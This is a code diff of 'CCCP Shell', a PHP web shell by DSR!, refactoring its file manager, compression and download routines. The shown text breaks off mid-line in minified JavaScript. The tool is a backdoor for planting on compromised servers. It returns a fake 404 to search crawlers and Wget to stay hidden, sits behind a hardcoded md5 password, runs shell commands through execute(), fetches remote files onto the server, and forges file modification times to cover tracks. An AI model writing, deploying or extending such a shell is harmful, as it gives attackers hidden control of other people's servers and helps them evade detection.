@@ -3,7 +3,7 @@
  * CCCP Shell
  * by DSR!
  * https://github.com/xchwarze/CCCPShell
- * v 1.0.0 build: 25/03/2016 03:14:26
+ * v 1.0.0 build: 29/12/2015 04:46:33
  */
 
 # System variables
@@ -16,8 +16,8 @@ $config['FMLimit'] = 100;   //file manager item limit. false = No limit
 $config['SQLLimit'] = 50;   //sql manager result limit.
 $config['checkBDel'] = true;//Check Before Delete: true = On 
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
-$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5('cccpshell')
-$config['rc4drop'] = 28;  //drop size
+$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
+$config['rc4drop'] = 49;  //drop size
 
 
 // ------ Start CCCPShell
@@ -43,20 +43,20 @@ define('SROOT', dirname(__file__) . DS);
 @ini_alter('allow_url_fopen', 1);
 
 @error_reporting(7);
-@ini_set('memory_limit', '128M'); //change it if phpzip fails
+@ini_set('memory_limit', '64M'); //change it if phpzip fails
 @set_magic_quotes_runtime(0);
 @set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 
 $uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
-if (empty($_SERVER['HTTP_USER_AGENT']) || preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
     header('HTTP/1.0 404 Not Found');
     exit;
 }
 
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
-	header("Content-Type: text/html; charset={$config['charset']}");
+	header("Content-Type: text/html; charset=$config[charset]");
 
 function mHide($n, $v){
 	return "<input id='$n' name='$n' type='hidden' value='$v' />";
@@ -68,66 +68,47 @@ function mLink($t, $o, $e = '', $m = true){
 }
 
 function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
-	if ($tt !== '') $tt = "$tt<br>";
-
-	$input = "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
-	if ($nl !== '')	$input = "<p>$input</p>";
-		
-	return $input;
+	if ($tt !== '') $tt = "$tt<br>"; 
+	if ($nl !== '')
+		return "<p>$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e /></p>";
+	else
+		return "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
 }
 
 function mSubmit($v, $o, $nl = '', $e = ''){
-	$input = "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
-	if ($nl !== '') $input = "<p>$input</p>";
-	
-	return $input;
+	if ($nl !== '')
+		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;' $e ></p>";
+	else
+		return "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
 }
 
 function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
 	$tmp = '';
 	if ($o) $o = "onchange='$o'";
 	if ($t) $t = "$t<br>";
-	foreach ($v as $key => $value){
-		if ($nk) $key = $value;
-		$tmp .= "<option value='$key'" . ($s == $key ? " selected='selected'" : "") . ">$value</option>";
+	if ($nk){
+		foreach ($v as $value){
+			if ($s == $value)
+				$tmp .= "<option value='$value' selected='selected'>$value</option>";
+			else 
+				$tmp .= "<option value='$value'>$value</option>";
+		}
+	} else {
+		foreach ($v as $key=>$value){
+			if ($s == $value)
+				$tmp .= "<option value='$key' selected='selected'>$value</option>";
+			else 
+				$tmp .= "<option value='$key'>$value</option>";
+		}
 	}
-
 	$tmp = "$t<select class='theme' id='$n' name='$n' $o $e>$tmp</select>";
-	if ($nl) 
-		$tmp = "<p>$tmp</p>";
-	
+	if ($nl) $tmp = "<p>$tmp</p>";
 	return $tmp;
 }
 
 function mCheck($n, $v, $o = '', $c = false){
 	return "<input id='$n' name='$n' value='$v' type='checkbox' onclick='$o' " . ($c ? 'checked' : '') . "/>";
 }
-
-function genPaginator($c, $t = -1, $fm = true) {
-	global $p;
-	
-	$l = 'dbexec(euc("' . (isset($p['code']) ? $p['code'] : '') . '") + "&pg=';
-	if ($fm)
-		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
-	
-	if ($t < 0)
-		$t = $c + 1;
-	
-	$tmp = '<div class="paginator">';
-	$i = 0;
-	while($i < $t) {
-		$i++;
-		if ($i < $c)
-			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
-		else if ($i == $c)
-			$tmp .= '<span class="current">' . $i . '</span>';
-		else
-			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
-	}
-
-	return $tmp . '</div>';
-}
-
 
 function fix_magic_quote($arr){
 	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
@@ -348,32 +329,14 @@ function getcfg($n){
     else return $result;
 }
 
-if (!function_exists('file_get_contents')) {
-	function file_get_contents($file){
-		$h = @fopen($file, 'rb');
-		if (!$h)
-            return false;
-
+function read_file($file){
+	$content = false;
+	if($fh = @fopen($file, 'rb')){
 		$content = '';
-		while(!feof($h))
-			$content .= fread($h, 8192);
-		
-		return $content;
+		while(!feof($fh))
+			$content .= fread($fh, 8192);
 	}
-}
-
-if (!function_exists('file_put_contents')) {
-	define('FILE_APPEND', 1);
-    function file_put_contents($file, $data, $flag = false) {
-    	$mode = ($flag == FILE_APPEND || strtoupper($flag) == 'FILE_APPEND') ? 'a' : 'w';
-        $h = @fopen($file, $mode);
-        if (!$h)
-            return false;
-        
-        $bytes = fwrite($h, $data);
-        fclose($h);
-        return $bytes;
-    }
+	return $content;
 }
 
 function sizecount($s){
@@ -394,17 +357,6 @@ function getUpPath($n){
     if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
     $uppath = implode(DS, $pathdb) . DS;
     return $uppath;
-}
-
-function get_all_files($path){
-	$files = glob(realpath($path).DS.'*');
-	foreach ($variable as $value) {
-		if (is_dir($value)){
-			$subdir = glob($value.DS.'*');
-			if (is_array($files) && is_array($subdir)) $files = array_merge($files, $subdir);
-		}
-	}
-	return $files;
 }
 
 function sAjax($i){
@@ -444,48 +396,51 @@ function zip($files, $archive){
 	$zip->close();
 }
 
-# Based on PHPZip - v1.23 by DSR!
+//TODO: agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
+//para poder usarlo con archivos enormes/poca memoria
+# Based on PHPZip v1.2 by DSR!
 class PHPZip {
     var $datasec = array();
     var $ctrl_dir = array();
-    var $cut_from_route = 0;
-    var $file_count = 0;
     var $old_offset = 0;
 
     function Zipper($basedir, $filelist){
-        $this->cut_from_route = strlen(dirname($basedir . $filelist[0])) + 1;
-        foreach ($filelist as $f){   
-            $f = $basedir . $f;
-            if (is_dir($f))
-                $this->AddFolderContent($f);
-            else if (is_file($f))
-                $this->addFileProc($f);
+		$cdir = dirname($basedir . $filelist[0]) . DS;
+		$cut = strlen($cdir);
+		foreach ($filelist as $f){	
+			$f = $basedir . $f;
+			if (file_exists($f)){
+				if (is_dir($f)) $sBuff = $this->GetFileList($f, $cut);
+				else if (is_file($f)){
+					$fd = fopen($f, 'r');
+					$sBuff = @fread($fd, filesize($f));
+					fclose($fd);
+					$this->addFile($sBuff, substr($f, $cut));
+				}
+			}
         }
+        $out = $this->file();
+		
+        return 1;
     }
 
-    function AddFolderContent($dir){
-        if (!file_exists($dir))
-            return false;
-           
-        $h = @opendir($dir);
-        while (false !== ($f = @readdir($h))) {
-            if ($f === '.' || $f === '..')
-                continue;
-
-            $f = $dir . $f;
-            if (is_dir($f))
-                $this->AddFolderContent($f . DS);
-            else if (is_file($f))
-                $this->addFileProc($f);
+    function GetFileList($dir, $cut){
+        if (file_exists($dir)){			
+            $h = opendir($dir);
+            while ($f = readdir($h)){
+                if (($f !== '.') && ($f !== '..')){
+                    if (is_dir($dir . $f)) $this->GetFileList($dir . $f . DS, $cut);
+                    else if (is_file($dir . $f)){
+						$fd = fopen($dir . $f, 'r');
+						$sBuff = @fread($fd, filesize($dir . $f));
+						fclose($fd);
+						$this->addFile($sBuff, substr($dir . $f, $cut));
+                    }
+                }
+            }
+            closedir($h);
         }
-        @closedir($h);
-    }
-
-    function addFileProc($file){
-        if (!file_exists($file))
-            return false;
-        
-        $this->addFile(file_get_contents($file), substr($file, $this->cut_from_route));
+        return 1;
     }
 
     function unix2DosTime($t = 0){
@@ -505,58 +460,72 @@ class PHPZip {
 	}
 
     function addFile($data, $name, $time = 0){
+		$packv0 = pack('v', 0);
         $dtime = dechex($this->unix2DosTime($time));
 		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
-        $packv0 = pack('v', 0);
-        $zdata = gzcompress($data);
-        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
+        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;
 
         // "local file header" segment
-        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;
-        $pack_info = pack('V', crc32($data)) . pack('V', strlen($zdata)) . pack('V', strlen($data));
-        
-        $fr .= $pack_info . pack('v', strlen($name)) . $packv0 . $name;
-        $fr .= $zdata; // "file data" segment
-        $fr .= $pack_info; // "data descriptor" segment
+        $unc_len = strlen($data);
+        $crc = crc32($data);
+        $zdata = gzcompress($data);
+        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
+        $c_len = strlen($zdata);
+        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $name;
+
+        // "file data" segment
+        $fr .= $zdata;
+
+        // "data descriptor" segment
+        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len);
+
+        // add this entry to array
         $this->datasec[] = $fr;
 
         // now add to central directory record
         $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
-        $cdrec .= $pack_info . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
-        $cdrec .= pack('V', $this->old_offset) .  $name;
+        $cdrec .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
+        $cdrec .= pack('V', $this->old_offset);
+        $this->old_offset += strlen($fr);
+        $cdrec .= $name;
 
         // save to central directory
-        $this->old_offset += strlen($fr);
-        $this->file_count += 1;
         $this->ctrl_dir[] = $cdrec;
     }
 
     function file(){
         $data = implode('', $this->datasec);
         $ctrldir = implode('', $this->ctrl_dir);
-        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', $this->file_count) . pack('v', $this->file_count) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
+        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
     }
 
     function output($file){
-    	return file_put_contents($file, $this->file());
+        $fp = fopen($file, 'w');
+        fwrite($fp, $this->file());
+        fclose($fp);
     }
 }
 
 function compress($type, $archive, $files){
-	if (!is_array($files)) $files = array($files);
-	if ($type=='zip'){
+	if(!is_array($files)) $files = array($files);
+	if($type=='zip'){
 		if(class_exists('ZipArchive'))
 			if (zip($files, $archive)) return true;
 		else {
 			//TODO
 		}
-	} else if ($type=='tar' || $type=='targz') {
+	} else if (($type=='tar')||($type=='targz')){
 		$archive = basename($archive);
 		$listsBasename = array_map('basename', $files);
 		$lists = array_map('wrap_with_quotes', $listsBasename);
-		$command = ($type == 'targz' ? 'czf' : 'cf');
-		execute('tar '.$command.'czf "'.$archive.'" '.implode(' ', $lists));
-		return is_file($archive);
+
+		if ($type=='tar') 
+			execute('tar cf "'.$archive.'" '.implode(' ', $lists));
+		else if ($type=='targz') 
+			execute('tar czf "'.$archive.'" '.implode(' ', $lists));
+
+		if (is_file($archive)) 
+			return true;
 	}
 	return false;
 }
@@ -571,32 +540,40 @@ function decompress($type, $archive, $path){
 				$target = $path.basename($archive,'.zip');
 				if($zip->open($archive)){
 					if(!is_dir($target)) mkdir($target);
-					$zip->extractTo($target); //return true;
-					return $zip->close();
+					if($zip->extractTo($target)) return true;
+					$zip->close();
 				}
+			} else {
+				//TODO
 			}
-		} else if ($type=='tar' || $type=='targz') {
+		} else if($type=='untar'){
+			$target = basename($archive,'.tar');
+			if(!is_dir($target)) mkdir($target);
+			$before = count(get_all_files($target));
+			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
+			$after = count(get_all_files($target));
+			if($before!=$after) return true;
+		} else if($type=='untargz'){
 			$target = '';
 			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
 			else if(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
-			else if(strpos(strtolower($archive), '.tar')!==false) $target = basename($archive,'.tar');
-
 			if(!is_dir($target)) mkdir($target);
 			$before = count(get_all_files($target));
-			$command = ($type == 'untargz' ? 'xzf' : 'xf');
-			execute('tar '.$command.' "'.basename($archive).'" -C "'.$target.'"');
+			execute('tar xzf "'.basename($archive).'" -C "'.$target.'"');
 			$after = count(get_all_files($target));
-			return $before != $after;
+			if($before!=$after) return true;
 		}
 	}
 	return false;
 }
 
-function download($url, $save){
+function download($url ,$save){
 	if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
-	if(is_file($save)) unlink($save);
-	if($sBuff = file_get_contents($url)){
-		if(file_put_contents($save, $sBuff))
+	$filename = basename($url);
+
+	if($sBuff = read_file($url)){
+		if(is_file($save)) unlink($save);
+		if(write_file($save, $sBuff))
 			return true;
 	}
 	
@@ -659,6 +636,31 @@ function filesize64($file){
 	}
 	
 	return $size;
+}
+
+function genPaginator($c, $t = -1, $fm = true) {
+	global $p;
+	
+	$l = 'dbexec(euc("' . (isset($p['code']) ? $p['code'] : '') . '") + "&pg=';
+	if ($fm)
+		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
+	
+	if ($t < 0)
+		$t = $c + 1;
+	
+	$tmp = '<div class="paginator">';
+	$i = 0;
+	while($i < $t) {
+		$i++;
+		if ($i < $c)
+			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
+		else if ($i == $c)
+			$tmp .= '<span class="current">' . $i . '</span>';
+		else
+			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
+	}
+
+	return $tmp . '</div>';
 }
 
 
@@ -834,18 +836,17 @@ if (isset($p['me'])) {
 	function dirsize($dir){
         $f = $s = 0;
         $dh = @opendir($dir);
-        while (false !== ($file = @readdir($dh))){
-			if ($file === '.' || $file === '..')
-                continue;
-			
-			$path = $dir . DS . $file;
-			if (is_dir($path)){
-				$tmp = dirsize($path); 
-				$f += $tmp['f'];  
-				$s += $tmp['s'];  
-			} else {
-				$f++;
-				$s += @filesize($path);
+        while ($file = @readdir($dh)){
+			if ($file !== '.' && $file !== '..'){
+				$path = $dir . DS . $file;
+				if (@is_dir($path)){
+					$tmp = dirsize($path); 
+					$f = $f + $tmp['f'];  
+					$s = $s + $tmp['s'];  
+				} else {
+					$f++;
+					$s += @filesize($path);
+				}
 			}
         }
         @closedir($dh);
@@ -867,21 +868,21 @@ if (isset($p['me'])) {
 		else if (($mode & 0x1000) === 0x1000) $type = 'pa';// FIFO pipe
 		else $type = '?';                                 // Unknown
 
-		$o['r'] = ($mode & 00400) ? 'r' : '-'; 
-		$o['w'] = ($mode & 00200) ? 'w' : '-'; 
-		$o['e'] = ($mode & 00100) ? 'x' : '-'; 
-		$g['r'] = ($mode & 00040) ? 'r' : '-'; 
-		$g['w'] = ($mode & 00020) ? 'w' : '-'; 
-		$g['e'] = ($mode & 00010) ? 'x' : '-'; 
-		$w['r'] = ($mode & 00004) ? 'r' : '-'; 
-		$w['w'] = ($mode & 00002) ? 'w' : '-'; 
-		$w['e'] = ($mode & 00001) ? 'x' : '-'; 
+		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
+		$owner['write'] = ($mode & 00200) ?   'w' : '-'; 
+		$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
+		$group['read'] = ($mode & 00040) ?    'r' : '-'; 
+		$group['write'] = ($mode & 00020) ?   'w' : '-'; 
+		$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
+		$world['read'] = ($mode & 00004) ?    'r' : '-'; 
+		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
+		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
 
-		if ($mode & 0x800) $o['e'] = ($o['e']==='x') ? 's' : 'S';
-		if ($mode & 0x400) $g['e'] = ($g['e']==='x') ? 's' : 'S';
-		if ($mode & 0x200) $w['e'] = ($w['e']==='x') ? 't' : 'T';
+		if ($mode & 0x800){$owner['execute'] = ($owner['execute']==='x') ? 's' : 'S';}
+		if ($mode & 0x400){$group['execute'] = ($group['execute']==='x') ? 's' : 'S';}
+		if ($mode & 0x200){$world['execute'] = ($world['execute']==='x') ? 't' : 'T';}
 		
-		return $type.$o['r'].$o['w'].$o['e'].$g['r'].$g['w'].$g['e'].$w['r'].$w['w'].$w['e'];
+		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
     }
 
     function getUser($filepath){
@@ -911,8 +912,7 @@ if (isset($p['me'])) {
 		    $item = readdir($h);
 		    if ($item === '.' or $item === '..')
 		        continue;
-
-		    if (gettype($item) === 'boolean'){
+		    else if (gettype($item) === 'boolean'){
 		        closedir($h);
 		        if (!@rmdir($path))
 					return false;
@@ -1036,22 +1036,21 @@ if (isset($p['me'])) {
 			case 'cdir':
 				if (file_exists($p['a'] . $p['b']))
 					sAjax(tText('alredyexists', 'object alredy exists'));
-				
-				@mkdir($p['a'] . $p['b'], 0777);
-				@chmod($p['a'] . $p['b'], 0777);
-				if (file_exists($p['a'] . $p['b']))
-					sAjax('OK');
-
-				sAjax(tText('fail', 'Fail!'));
+				else {
+					sAjax(@mkdir($p['a'] . $p['b'], 0777) ? 'OK' : tText('fail', 'Fail!'));
+					@chmod($p['a'] . $p['b'], 0777);
+				}
 				break;
 			case 'cfile':
 				if (file_exists($p['a'] . $p['b']))
 					sAjax(tText('alredyexists', 'object alredy exists'));
-
-				if (false !== file_put_contents($p['a'] . $p['b'], '')) 
-					sAjax('OK');
-
-				sAjax(tText('accessdenied', 'Access denied'));
+				else {
+					$fp = @fopen($p['a'] . $p['b'], 'w');
+					if ($fp){
+						@fclose($fp);
+						sAjax('OK');
+					} else sAjax(tText('accessdenied', 'Access denied'));
+				}
 				break;
 			case 'comp':
 				if ($p['dl']){
@@ -1065,30 +1064,6 @@ if (isset($p['me'])) {
 					exit;
 				}
 				break;
-			case 'uncomp':
-				if ($p['dl']){
-					$types['zip'] = 'zip';
-					$types['tar'] = 'tar';
-					$types['tar.gz'] = 'targz';
-					$types['tgz'] = 'targz';
-
-					$fNames = array();
-					foreach($p['dl'] as $value){
-						$ext = pathinfo($value);
-						if (isset($types[ $ext['extension'] ]))
-							if (decompress($types[ $ext['extension'] ], $p['fl'] . $value, $p['fl']))
-								$fNames[] = $value;
-					}
-
-					sAjax(tText('pfm', 'Process files:') . implode(', ', $fNames) . ' (' . count($fNames) . ')');
-				}			
-				break;
-			case 'reup':
-				if (download($p['b'], $p['a'] . basename($p['b']))) 
-					sAjax('OK');
-
-				sAjax(tText('fail', 'Fail'));
-				break;
 			case 'copy': 
 				if ($p['dl']){
 					$fNames = Array();
@@ -1098,22 +1073,22 @@ if (isset($p['me'])) {
 						$fileinfo = pathinfo($p['fl'] . $p['dl'][$z]);
 						if (!file_exists($p['fl'] . $p['dl'][$z]))
 							sAjax(tText('notexist', 'Object does not exist'));
-						
-						if (is_dir($p['fl'] . $p['dl'][$z])){ 
-							if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
-						} else {
-							if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
+						else {
+							if (is_dir($p['fl'] . $p['dl'][$z])){ 
+								if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
+							} else {
+								if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
+							}
 						}
 					}
-
 					sAjax(hsc(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']'));
 				}
 				break;
 			case 'del':
 				if (!file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));	
+				else
+					sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));				
 				break;
 			case 'rdel':
 				if ($p['dl']){
@@ -1132,46 +1107,48 @@ if (isset($p['me'])) {
 			case 'dl':
 				if (!file_exists($p['fl']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				$fileinfo = pathinfo($p['fl']);
-				header('Content-Type: application/x-' . $fileinfo['extension']);
-				header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
-				header('Content-Length: ' . filesize($p['fl']));
-				readfile($p['fl']);
-				exit;
+				else {
+					$fileinfo = pathinfo($p['fl']);
+					header('Content-Type: application/x-' . $fileinfo['extension']);
+					header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
+					header('Content-Length: ' . filesize($p['fl']));
+					@readfile($p['fl']);
+					exit;
+				}
 				break;
 			case 'edit':
-				if (file_put_contents($p['a'], $p['fc']))
-					sAjax(tText('ok', 'Ok!'));
-
-				tText('fail', 'Fail!');
+				$fp = @fopen($p['a'], 'w');
+				sAjax((@fwrite($fp, $p['fc']) ? tText('ok', 'Ok!') : tText('fail', 'Fail!')));
+				@fclose($fp);
 				break;
 			case 'mdate':
 				if (!@file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				if (isset($p['b'])) $time = strtotime($p['b']);
-				else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
-				sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				else {
+					if (isset($p['b'])) $time = strtotime($p['b']);
+					else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
+					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				}
 				break;
 			case 'mdatec':
 				if (!@file_exists($p['a']) || !@file_exists($p['b'])) 
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				$time = @filemtime($p['b']);
-				sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				else {
+					$time = @filemtime($p['b']);
+					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+				}
 				break;				
 			case 'mpers':
 				if (!file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
+				else
+					sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
 				break;	
 			case 'ren':
 				if (!file_exists($p['a']))
 					sAjax(tText('notexist', 'Object does not exist'));
-				
-				sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
+				else
+					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
 				break;
 		}
 	} else if (@$p['md'] === 'info'){
@@ -1259,7 +1236,7 @@ if (isset($p['me'])) {
 							$sBuff .= '</div>';
 						}
 					} else
-						$sBuff .= sDialog(tText('hlerror', 'highlight_file() dont exist!'));
+						sDialog(tText('hlerror', 'highlight_file() dont exist!'));
 				} else {
 					$str = @fread($fp, filesize($p['t']));
 					$sBuff .= '<b>File:</b><br>' .
@@ -1315,7 +1292,7 @@ if (isset($p['me'])) {
 		}
 	} else {
 		if (isset($p['ac']) && $p['ac'] === 'up')
-			$sBuff .= sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
+			sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
 				
 		$currentdir = $shelldir;
         if (!empty($p['dir'])){
@@ -1455,7 +1432,7 @@ if (isset($p['me'])) {
 			$sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 				<td width="2%">' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>
 				<td>' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp")') . ' | ' . 
-				mLink(tText('del', 'Del'), 'showUISec("rdel")') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy")') . ' | ' . mLink(tText('uncompress', 'Uncompress'), 'showUISec("uncomp")') . '</td>
+				mLink(tText('del', 'Del'), 'showUISec("rdel")') . ' | ' . mLink(tText('copy', 'Copy'), 'showUISec("copy")') . '</td>
 				<td colspan="4" align="right">
 				<b>' . $d . '</b> ' . tText('dirs', 'Directories')  . ' / <b>' . $c . '</b> ' . tText('fils', 'Files') . '
 				</td>
@@ -2078,7 +2055,7 @@ if (isset($p['me'])) {
 	  <title>CCCP Modular Shell</title>  
 	  <script type="text/javascript">
 	  		var targeturl = "' . getSelf() . '";
-	  		var h=0;var j=1;var d=document;var euc=encodeURIComponent;var onDrag=false;var dragX,dragY,dragDeltaX,dragDeltaY,lastAjax,lastLoad="";var copyBuffer=[];sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML="&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete 